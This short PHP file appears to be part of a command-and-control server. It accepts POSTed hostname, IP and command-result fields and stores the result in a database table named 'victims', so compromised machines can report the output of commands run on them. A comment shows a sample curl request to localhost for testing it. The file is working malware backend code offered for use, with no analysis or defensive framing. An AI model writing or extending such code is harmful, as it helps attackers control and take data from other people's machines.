<?php
// curl -d "hostname=RegisterTest&ip=127.0.0.1&result=testingResult" -X POST http://localhost/getResult.php

include "conn.php";
if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["result"])){
  $getResultQuery = $mysql->prepare("update victims set cmdresult=? where hostname=? and ip=?");
  $getResultQuery->bind_param("sss", $_POST["result"], $_POST["hostname"], $_POST["ip"]);
  $getResultQuery->execute();
}
